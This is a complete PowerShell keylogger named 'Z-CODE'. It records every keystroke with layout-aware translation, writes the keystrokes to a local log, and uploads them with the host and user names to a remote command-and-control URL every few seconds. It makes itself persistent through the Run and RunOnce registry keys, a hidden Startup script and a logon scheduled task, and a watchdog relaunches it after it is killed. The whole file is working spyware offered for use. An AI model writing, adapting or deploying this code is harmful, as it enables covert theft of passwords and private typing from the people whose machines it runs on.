# ============================================================
#  Z-CODE - background agent: captures, logs locally, uploads.
#  Stop: Ctrl+Alt+Q  or  stop.vbs  (stop.bat)
#  Modes (internal, used by install.bat): -Register  -Watchdog  -NoWatchdog
# ============================================================
param(
    [switch]$Register,
    [switch]$Watchdog,
    [switch]$NoWatchdog
)
$ErrorActionPreference = 'Stop'

$SpecialKeys = $true

# ---- BACKSPACE BEHAVIOUR -----------------------------------
#   What the C2 receives: '' = nothing, otherwise this literal marker.
$BackspaceToServer = '[delete]'
#   What the local log does: 'delete' (mirror screen) | 'mark' | 'both'
$BackspaceToLog    = 'delete'
# ------------------------------------------------------------

# ---- REMOTE UPLOAD -----------------------------------------
$ServerUrl  = 'https://time-management.app/zcode/ingest.php'   # <-- EDIT
$AuthToken  = '234523fgergzetrgeraTETRETR45'                    # <-- EDIT
$SendEvery  = 5000      # ms between upload attempts
$BatchBytes = 65536     # max bytes per POST
# ------------------------------------------------------------

$LogPath        = Join-Path $env:USERPROFILE 'ZCODE_keycapture_log.txt'
$PidPath        = Join-Path $env:USERPROFILE 'ZCODE.pid'
$SpoolPath      = Join-Path $env:USERPROFILE 'ZCODE_spool.bin'
$OffsetPath     = Join-Path $env:USERPROFILE 'ZCODE_spool.offset'
$StopPath       = Join-Path $env:USERPROFILE 'ZCODE.stop'
$SpoolMutexName = 'ZCODE_Spool_Mutex'
$VbsPath        = Join-Path $PSScriptRoot 'Z-CODE.vbs'

$fs = $null; $spoolFs = $null; $spoolMtx = $null; $spoolEnc = $null
$ps = $null; $rs = $null
$stopRequested = $false
$floor = 0

function Log([string]$t) { [System.IO.File]::AppendAllText($LogPath, $t) }

# ---------------- persistence ----------------
function Get-LaunchCommand {
    if (Test-Path -LiteralPath $VbsPath) { return 'wscript.exe "' + $VbsPath + '"' }
    return 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $PSCommandPath + '"'
}

function Install-Persistence {
    $cmd = Get-LaunchCommand
    try { (Get-Item -LiteralPath 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run').SetValue('Z-CODE Key Capture', $cmd, 'String') } catch {}
    try { (Get-Item -LiteralPath 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce').SetValue('Z-CODE Key Capture', $cmd, 'String') } catch {}
    try {
        $lnk  = Join-Path ([Environment]::GetFolderPath('Startup')) 'Z-CODE Key Capture.vbs'
        $line = 'CreateObject("WScript.Shell").Run "' + ($cmd -replace '"', '""') + '", 0, False'
        [System.IO.File]::WriteAllText($lnk, $line, (New-Object System.Text.ASCIIEncoding))
    } catch {}
    try {
        # task action must be console-less too: wscript when the launcher exists
        $act = if (Test-Path -LiteralPath $VbsPath) {
            'wscript.exe "' + $VbsPath + '"'
        } else {
            'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $PSCommandPath + '"'
        }
        & schtasks.exe /create /f /sc onlogon /tn 'Z-CODE Key Capture' /tr $act 2>$null | Out-Null
    } catch {}
}

if ($Register) {
    Install-Persistence
    Write-Host '  persistence registered: Run, RunOnce, Startup, logon task'
    exit 0
}

# ---------------- watchdog ----------------
if ($Watchdog) {
    $wdMtx = New-Object System.Threading.Mutex($false, 'ZCODE_Watchdog_Mutex')
    if (-not $wdMtx.WaitOne(0)) { exit 0 }
    $misses = 0
    while ($true) {
        Start-Sleep -Seconds 10
        if (Test-Path -LiteralPath $StopPath) { exit 0 }
        $alive = $false
        if (Test-Path -LiteralPath $PidPath) {
            $id = 0
            if ([int]::TryParse((Get-Content -LiteralPath $PidPath -Raw).Trim(), [ref]$id)) {
                $alive = [bool](Get-Process -Id $id -ErrorAction SilentlyContinue)
            }
        }
        if ($alive) { $misses = 0; continue }
        $misses++
        if ($misses -lt 2) { continue }
        $misses = 0
        Install-Persistence
        try {
            if (Test-Path -LiteralPath $VbsPath) {
                Start-Process wscript.exe -ArgumentList ('"' + $VbsPath + '"') | Out-Null
            } else {
                Start-Process powershell.exe -NoNewWindow -ArgumentList @(
                    '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
                    '-File', ('"' + $PSCommandPath + '"'), '-NoWatchdog') | Out-Null
            }
        } catch {}
        Start-Sleep -Seconds 20
    }
}

# ---------------- background uploader ----------------
$senderScript = {
    param($SpoolPath, $OffsetPath, $Url, $Token, $IntervalMs, $MaxBytes, $MutexName)

    $ErrorActionPreference = 'Continue'
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

    $enc = [System.Text.UTF8Encoding]::new($false)
    $mtx = [System.Threading.Mutex]::new($false, $MutexName)
    $rfs = $null
    $offset = 0L
    try { $offset = [long]((Get-Content -LiteralPath $OffsetPath -ErrorAction Stop).Trim()) } catch { $offset = 0L }

    $headers = @{}
    if ($Token) { $headers['Authorization'] = 'Bearer ' + $Token }

    $buf = [byte[]]::new($MaxBytes)

    while ($true) {
        $payload = ''; $consumed = 0

        $mtx.WaitOne()
        try {
            if (-not $rfs) {
                $rfs = [System.IO.FileStream]::new($SpoolPath, [System.IO.FileMode]::OpenOrCreate,
                                                  [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
            }
            $len = $rfs.Length
            if ($offset -gt $len) { $offset = 0 }
            if ($len -gt $offset) {
                $toRead = [Math]::Min([long]($len - $offset), [long]$MaxBytes)
                $rfs.Position = $offset
                $n = $rfs.Read($buf, 0, [int]$toRead)
                if ($n -gt 0) {
                    $dec   = $enc.GetDecoder()
                    $chars = [char[]]::new($n + 2)
                    $bUsed = 0; $cUsed = 0; $done = $false
                    $dec.Convert($buf, 0, $n, $chars, 0, $chars.Length, $false, [ref]$bUsed, [ref]$cUsed, [ref]$done)
                    if ($cUsed -gt 0) { $payload = -join ($chars[0..($cUsed - 1)]) }
                    $consumed = $bUsed
                }
            } elseif ($len -gt 0) {
                $rfs.SetLength(0)
                $offset = 0
                Set-Content -LiteralPath $OffsetPath -Value '0'
            }
        } finally { $mtx.ReleaseMutex() }

        if ($payload) {
            $body = @{
                host = $env:COMPUTERNAME
                user = $env:USERNAME
                ts   = (Get-Date).ToString('o')
                data = $payload
            } | ConvertTo-Json -Compress

            $ok = $false
            try {
                Invoke-RestMethod -Uri $Url -Method Post -Headers $headers `
                    -ContentType 'application/json; charset=utf-8' -Body $body -TimeoutSec 15 | Out-Null
                $ok = $true
            } catch { $ok = $false }

            if ($ok -and $consumed -gt 0) {
                $offset += $consumed
                Set-Content -LiteralPath $OffsetPath -Value $offset
            }
        }

        Start-Sleep -Milliseconds $IntervalMs
    }
}

try {
    Install-Persistence
    Remove-Item -LiteralPath $StopPath -ErrorAction SilentlyContinue

    $mutex = New-Object System.Threading.Mutex($false, 'ZCODE_KeyCapture_Mutex')
    if (-not $mutex.WaitOne(0)) { Log "`r`n[blocked: another instance already running]`r`n"; exit }

    if (-not $NoWatchdog) {
        try {
            Start-Process powershell.exe -NoNewWindow -ArgumentList @(
                '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
                '-File', ('"' + $PSCommandPath + '"'), '-Watchdog') | Out-Null
        } catch {}
    }

    $fs = New-Object System.IO.FileStream($LogPath, [System.IO.FileMode]::OpenOrCreate, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)

    $fs.Position = 0
    $head = New-Object byte[] 3
    $null = $fs.Read($head, 0, 3)
    if (-not ($head[0] -eq 0xEF -and $head[1] -eq 0xBB -and $head[2] -eq 0xBF)) {
        $fs.Position = 0
        $old = New-Object byte[] $fs.Length
        $null = $fs.Read($old, 0, $old.Length)
        $fs.Position = 0; $fs.SetLength(0)
        $fs.Write([byte[]](0xEF,0xBB,0xBF), 0, 3)
        $fs.Write($old, 0, $old.Length)
    }
    $fs.Position = $fs.Length

    function WriteRaw([string]$t) {
        if (-not $t) { return }
        $b = [System.Text.Encoding]::UTF8.GetBytes($t)
        $fs.Write($b, 0, $b.Length)
        $fs.Flush()
    }

    function DeleteLastChar {
        if ($fs.Length -le $floor) { return }
        $fs.Flush()
        $max = [Math]::Min(4, $fs.Length - $floor)
        $buf = New-Object byte[] $max
        $fs.Position = $fs.Length - $max
        $null = $fs.Read($buf, 0, $max)
        $n = 1
        for ($i = $max - 1; $i -ge 0; $i--) {
            if (($buf[$i] -band 0xC0) -ne 0x80) { $n = $max - $i; break }
        }
        $fs.SetLength($fs.Length - $n)
        $fs.Position = $fs.Length
        $fs.Flush()
    }

    WriteRaw ("`r`n===== Z-CODE started " + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') + " =====`r`n")
    $floor = $fs.Length

    if ($ServerUrl) {
        if (-not (Test-Path $SpoolPath))  { New-Item -ItemType File -Path $SpoolPath -Force | Out-Null }
        if (-not (Test-Path $OffsetPath)) { Set-Content -LiteralPath $OffsetPath -Value '0' }
        $spoolEnc = [System.Text.UTF8Encoding]::new($false)
        $spoolMtx = [System.Threading.Mutex]::new($false, $SpoolMutexName)
        $spoolFs  = [System.IO.FileStream]::new($SpoolPath, [System.IO.FileMode]::Append,
                                                [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite)

        $rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
        $rs.ApartmentState = [System.Threading.ApartmentState]::MTA
        $rs.ThreadOptions  = [System.Management.Automation.Runspaces.PSThreadOptions]::ReuseThread
        $rs.Open()
        $ps = [System.Management.Automation.PowerShell]::Create()
        $ps.Runspace = $rs
        $null = $ps.AddScript($senderScript).
            AddArgument($SpoolPath).AddArgument($OffsetPath).AddArgument($ServerUrl).
            AddArgument($AuthToken).AddArgument($SendEvery).AddArgument($BatchBytes).
            AddArgument($SpoolMutexName)
        $null = $ps.BeginInvoke()
    }

    function Spool([string]$t) {
        if (-not $t -or -not $spoolFs) { return }
        $b = $spoolEnc.GetBytes($t)
        $null = $spoolMtx.WaitOne()
        try {
            $spoolFs.Seek(0, [System.IO.SeekOrigin]::End) | Out-Null
            $spoolFs.Write($b, 0, $b.Length)
            $spoolFs.Flush()
        } finally { $spoolMtx.ReleaseMutex() }
    }

    if ($ServerUrl) { Spool ("`n===== session " + $env:COMPUTERNAME + " " + (Get-Date).ToString('o') + " =====`n") }

    Add-Type -Namespace ZCode -Name Native -MemberDefinition @'
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr lpdwProcessId);
[DllImport("user32.dll")] public static extern IntPtr GetKeyboardLayout(uint idThread);
[DllImport("user32.dll")] public static extern uint MapVirtualKeyEx(uint uCode, uint uMapType, IntPtr dwhkl);
[DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
'@

    $tracked  = @(0x08, 0x09, 0x0D, 0x20)
    $tracked += 0x30..0x39
    $tracked += 0x41..0x5A
    $tracked += 0x60..0x6F
    $tracked += 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xDB, 0xDC, 0xDD, 0xDE, 0xE2

    $mark = @{}
    if ($SpecialKeys) {
        $mark = @{
            0x1B = '<ESC>'; 0x2E = '<DEL>'; 0x2D = '<INS>'
            0x25 = '<LEFT>'; 0x26 = '<UP>'; 0x27 = '<RIGHT>'; 0x28 = '<DOWN>'
            0x24 = '<HOME>'; 0x23 = '<END>'; 0x21 = '<PGUP>'; 0x22 = '<PGDN>'
        }
        for ($i = 0; $i -lt 12; $i++) { $mark[0x70 + $i] = '<F' + ($i + 1) + '>' }
    }

    $prev = @{}
    foreach ($vk in ($tracked + @($mark.Keys))) { $prev[$vk] = $false }

    function GetKeyStateArray {
        $st = New-Object byte[] 256
        foreach ($m in 0x10, 0x11, 0x12, 0x14, 0x90) {
            if (([ZCode.Native]::GetAsyncKeyState($m) -band 0x8000) -ne 0) { $st[$m] = 0x80 }
        }
        if (([ZCode.Native]::GetAsyncKeyState(0x14) -band 0x0001) -ne 0) { $st[0x14] = $st[0x14] -bor 0x01 }
        if (([ZCode.Native]::GetAsyncKeyState(0x90) -band 0x0001) -ne 0) { $st[0x90] = $st[0x90] -bor 0x01 }
        if ($st[0x11] -ne 0 -and $st[0x12] -eq 0) { $st[0x11] = 0 }
        return ,$st
    }

    function GetActiveLayout {
        $fg  = [ZCode.Native]::GetForegroundWindow()
        $hkl = [IntPtr]::Zero
        if ($fg -ne [IntPtr]::Zero) {
            $tid = [ZCode.Native]::GetWindowThreadProcessId($fg, [IntPtr]::Zero)
            $hkl = [ZCode.Native]::GetKeyboardLayout($tid)
        }
        if ($hkl -eq [IntPtr]::Zero) { $hkl = [ZCode.Native]::GetKeyboardLayout(0) }
        return $hkl
    }

    function Translate([int]$vk) {
        $hkl  = GetActiveLayout
        $scan = [ZCode.Native]::MapVirtualKeyEx([uint32]$vk, 0, $hkl)
        $st   = GetKeyStateArray
        $sb   = New-Object System.Text.StringBuilder 8
        $rc   = [ZCode.Native]::ToUnicodeEx([uint32]$vk, $scan, $st, $sb, 8, 0, $hkl)
        if ($rc -gt 0) { return $sb.ToString() }
        return ''
    }

    Set-Content -LiteralPath $PidPath -Value $PID

    $VK_CTRL = 0x11; $VK_ALT = 0x12; $VK_Q = 0x51

    while ($true) {
        foreach ($vk in $tracked) {
            $s    = [ZCode.Native]::GetAsyncKeyState($vk)
            $down = ($s -band 0x8000) -ne 0
            if ((($s -band 0x0001) -ne 0) -or ($down -and -not $prev[$vk])) {
                switch ($vk) {
                    0x08 {
                        [void](Translate $vk)
                        if ($BackspaceToServer) { Spool $BackspaceToServer }
                        if ($BackspaceToLog -eq 'mark') {
                            if ($BackspaceToServer) { WriteRaw $BackspaceToServer }
                        } else {
                            $before = $fs.Length
                            DeleteLastChar
                            if ($BackspaceToLog -eq 'both') { if ($BackspaceToServer) { WriteRaw $BackspaceToServer } }
                            elseif ($fs.Length -eq $before -and $BackspaceToServer) { WriteRaw $BackspaceToServer }
                        }
                    }
                    0x0D {
                        [void](Translate $vk)
                        Spool "`n"
                        WriteRaw "`r`n"
                    }
                    default {
                        $t = Translate $vk
                        if ($t) { Spool $t; WriteRaw $t }
                    }
                }
            }
            $prev[$vk] = $down
        }

        foreach ($vk in @($mark.Keys)) {
            $s    = [ZCode.Native]::GetAsyncKeyState($vk)
            $down = ($s -band 0x8000) -ne 0
            if ((($s -band 0x0001) -ne 0) -or ($down -and -not $prev[$vk])) {
                Spool $mark[$vk]
                WriteRaw $mark[$vk]
            }
            $prev[$vk] = $down
        }

        if ((([ZCode.Native]::GetAsyncKeyState($VK_CTRL)) -band 0x8000) -and
            (([ZCode.Native]::GetAsyncKeyState($VK_ALT))  -band 0x8000) -and
            (([ZCode.Native]::GetAsyncKeyState($VK_Q))    -band 0x8000)) {
            WriteRaw ("`r`n===== Z-CODE stopped " + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') + " =====`r`n")
            $stopRequested = $true
            break
        }
        Start-Sleep -Milliseconds 15
    }
}
catch {
    Log ("`r`n[ERROR] " + $_.Exception.Message + "`r`n" + $_.ScriptStackTrace + "`r`n")
}
finally {
    if ($ps)      { try { $ps.Stop() } catch {}; try { $ps.Dispose() } catch {} }
    if ($rs)      { try { $rs.Close() } catch {}; try { $rs.Dispose() } catch {} }
    if ($spoolFs) { try { $spoolFs.Dispose() } catch {} }
    if ($fs)      { try { $fs.Flush() } catch {}; try { $fs.Dispose() } catch {} }
    if ($stopRequested) { try { Set-Content -LiteralPath $StopPath -Value ((Get-Date).ToString('o')) } catch {} }
    try { Remove-Item -LiteralPath $PidPath -ErrorAction SilentlyContinue } catch {}
}